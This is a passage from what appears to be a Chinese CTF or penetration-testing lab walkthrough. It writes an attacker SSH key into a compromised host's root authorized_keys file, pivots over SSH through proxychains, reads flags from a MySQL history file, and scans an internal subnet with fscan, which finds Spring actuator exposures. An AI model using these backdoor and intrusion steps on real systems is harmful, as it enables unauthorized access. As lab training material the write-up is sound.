
本地kali生成一个公钥，并写入

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDZYuEupRm/hWalqMOfLjHs5skSsFjUfK7dVb3K1uD75ITbdaeIVj6gZfssJ1A1euE2omXRoYiInDrnf+033BfTQvyeSENKI4vqjvvSad4Fy8c8tnIwBqtX6CoF7nr1XIzPH1vFQ/3nW//JlfrM7sxjpMXnd1EEJjJJrusD9Z1uV2jx9QdRJDxNCdErVss4kNhfkiG5W7gOQlkAYbrHFyWo4EtPuL0HVRt6Cb3tOMxKkQY98NO8RNLm5QXBjdIDLKVcfnOqvSxga7BuRym+ATJny/8zx9sOziQSQkQ/qfBeUJMPeaq9VkVAs2EwPDUrcmoUuWB9duxW1ekx+9pyQpuHhUuSbARFUFaGNfIGF0Lb2i9lC2RRRGUspyxDeJwx2n1KS2L/9S4aT4d1I4pRJy3ZF41c6XDvGVixQeJp6a2KUL+Yz0OrEBIW/sgZ+f4X435iEsUhGLOxavnnZh2gz8B231cmrecj0JNYVwLSkRC3+zgmOrwayDp/h8W36CV0odE//BumeStXB5ACq8++0B7ukd7HZs/2tEjac5oJrmdPsUkE3AmmXlDyGITR0LeUAD1daYWoisrkCuwL3tPP5YJqa0lBZmkN9RLzEzzDyXHbGLFtk2zDvRh8xqdm8mGQ7ZWu4aSwUFG6G1icmx3gSys7X3s1rZGXuVM9i0xBiH9wIQ== root@Xrntkk-Laptop" > /mnt/root/.ssh/authorized_keys
```

kali连ssh

```
 proxychains4 ssh -i /root/.ssh/id_rsa root@172.22.14.37
```

![image-20250522193504687](../assets/image-20250522193504687.png)

当前目录可以看到一个.mysql_history

```shell
root@ubuntu-k8s:~# cat .mysql_history
_HiStOrY_V2_
show\040databases;
create\040database\040flaghaha;
use\040flaghaha
DROP\040TABLE\040IF\040EXISTS\040`f1ag`;
CREATE\040TABLE\040`flag06`\040(
`id`\040int\040DEFAULT\040NULL,
\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL
)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
CREATE\040TABLE\040`flag06`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
show\040tables;
drop\040table\040flag06;
DROP\040TABLE\040IF\040EXISTS\040`f1ag`;
CREATE\040TABLE\040`flag04`\040(
`id`\040int\040DEFAULT\040NULL,
\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL
)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
CREATE\040TABLE\040`flag04`\040(\040`id`\040int\040DEFAULT\040NULL,\040\040\040`f1agggggishere`\040varchar(255)\040DEFAULT\040NULL\040)\040ENGINE=MyISAM\040DEFAULT\040CHARSET=utf8;
INSERT\040INTO\040`flag`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');
INSERT\040INTO\040`flag04`\040VALUES\040(1,\040'ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==');
exit
show\040tables
;
database();
select\040datebase();
show\040databases;
quit
```

看到flag04，base64解码后拿到flag

![image-20250522193658783](../assets/image-20250522193658783.png)

```
flag{da69c459-7fe5-4535-b8d1-15fff496a29f}
```



### 分支二 [172.22.10.0/24]

信息收集一手

```shell
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-05-22 18:02:37] [INFO] 暴力破解线程数: 1
[2025-05-22 18:02:37] [INFO] 开始信息扫描
[2025-05-22 18:02:37] [INFO] CIDR范围: 172.22.10.0-172.22.10.255
[2025-05-22 18:02:37] [INFO] 生成IP范围: 172.22.10.0.%!d(string=172.22.10.255) - %!s(MISSING).%!d(MISSING)
[2025-05-22 18:02:37] [INFO] 解析CIDR 172.22.10.0/24 -> IP范围 172.22.10.0-172.22.10.255
[2025-05-22 18:02:37] [INFO] 最终有效主机数量: 256
[2025-05-22 18:02:37] [INFO] 开始主机扫描
[2025-05-22 18:02:37] [INFO] 正在尝试无监听ICMP探测...
[2025-05-22 18:02:37] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-05-22 18:02:37] [INFO] 切换为PING方式探测...
[2025-05-22 18:02:37] [SUCCESS] 目标 172.22.10.28    存活 (ICMP)
[2025-05-22 18:02:37] [SUCCESS] 目标 172.22.10.16    存活 (ICMP)
[2025-05-22 18:02:43] [INFO] 存活主机数量: 2
[2025-05-22 18:02:43] [INFO] 有效端口数量: 233
[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.28:80
[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.16:22
[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.28:22
[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.28:3306
[2025-05-22 18:02:43] [SUCCESS] 端口开放 172.22.10.16:8080
[2025-05-22 18:02:43] [SUCCESS] 服务识别 172.22.10.16:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]
[2025-05-22 18:02:43] [SUCCESS] 服务识别 172.22.10.28:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]
[2025-05-22 18:02:44] [SUCCESS] 服务识别 172.22.10.28:3306 => [mysql] 版本:8.0.36-0ubuntu0.20.04.1 产品:MySQL Banner:[[.8.0.36-0ubuntu0.20.04.1.Gg-d|iR.N? / lIT1{L/ caching_sha2_password]
[2025-05-22 18:02:48] [SUCCESS] 服务识别 172.22.10.28:80 => [http] 版本:1.25.4 产品:nginx
[2025-05-22 18:02:49] [SUCCESS] 服务识别 172.22.10.16:8080 => [http]
[2025-05-22 18:02:49] [INFO] 存活端口数量: 5
[2025-05-22 18:02:49] [INFO] 开始漏洞扫描
[2025-05-22 18:02:49] [INFO] 加载的插件: mysql, ssh, webpoc, webtitle
[2025-05-22 18:02:49] [SUCCESS] 网站标题 http://172.22.10.16:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.10.16:8080/login;jsessionid=AC616F35E04329FCD36FCA388CB10817
[2025-05-22 18:02:49] [SUCCESS] 网站标题 http://172.22.10.28       状态码:200 长度:1975   标题:DooTask
[2025-05-22 18:02:49] [SUCCESS] 网站标题 http://172.22.10.16:8080/login;jsessionid=AC616F35E04329FCD36FCA388CB10817 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆
[2025-05-22 18:02:50] [SUCCESS] 目标: http://172.22.10.16:8080
  漏洞类型: poc-yaml-spring-actuator-heapdump-file
  漏洞名称: 
  详细信息:
        author:AgeloVito
        links:https://www.cnblogs.com/wyb628/p/8567610.html
[2025-05-22 18:02:50] [SUCCESS] 目标: http://172.22.10.16:8080
  漏洞类型: poc-yaml-springboot-env-unauth
  漏洞名称: spring2
  详细信息:
        links:https://github.com/LandGrey/SpringBootVulExploit
[2025-05-22 18:09:13] [SUCCESS] 扫描已完成: 7/7
```

扫出来一台机子

```
[2025-05-22 18:02:37] [SUCCESS] 目标 172.22.10.28    存活 (ICMP)
```

开放了80，22和3306端口

#### DooTask

在Harbor的project/projectadmin镜像中有可以找到服务的jar包

![image-20250522183204595](../assets/image-20250522183204595.png)

反编译后在application.properties中可以找到关于mysql的配置文件

![image-20250522183619872](../assets/image-20250522183619872.png)

可以看到数据库地址就是这台机子

MDUT一把梭拿到flag

![image-20250522184006046](../assets/image-20250522184006046.png)

```
flag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741}
```

